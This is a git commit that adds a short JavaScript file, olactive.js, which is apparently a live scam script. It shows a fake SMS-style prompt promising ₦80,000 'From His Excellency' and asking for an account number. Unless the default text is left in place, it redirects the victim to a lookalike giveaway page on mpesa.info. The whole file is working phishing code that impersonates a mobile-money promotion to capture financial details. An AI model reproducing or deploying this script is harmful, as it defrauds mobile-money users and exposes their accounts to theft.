5a69bc235235e56eb8d885f5bd496b70a43a36f6
mpessaa <34keeper_fusion@icloud.com>
2026-05-16 00:40:55 +0100

    Create olactive.js

---
+++ olactive.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦80,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦80,000 From His Excellency, click OK to Enter Your Acc. Number','WITHDRAW ₦80,000');
+if (password != 'WITHDRAW ₦80,000') {
+location.href='https://mpesa.info/80k-Birthday-Gift.html';
+}
